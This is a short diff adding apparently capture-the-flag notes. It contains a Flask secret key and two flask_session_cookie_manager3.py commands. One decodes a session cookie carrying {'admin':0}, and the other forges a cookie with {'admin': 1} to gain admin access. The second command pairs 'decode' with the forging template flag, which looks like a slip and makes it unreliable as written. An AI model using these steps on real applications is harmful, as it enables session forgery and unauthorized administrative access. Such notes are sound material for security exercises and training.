@@ -1,0 +1,5 @@
+028087b5a0de4e17ad9792ce693fb8aa*abcdefgh
+
+ python .\flask_session_cookie_manager3.py decode -s "028087b5a0de4e17ad9792ce693fb8aa*abcdefgh" -c "eyJhZG1pbiI6MH0.aJomqQ.K-neT3HDR5ZFZ_dqoNM9pPjC2OY"
+
+ python .\flask_session_cookie_manager3.py decode -s "028087b5a0de4e17ad9792ce693fb8aa*abcdefgh" -t "{'admin': 1}"
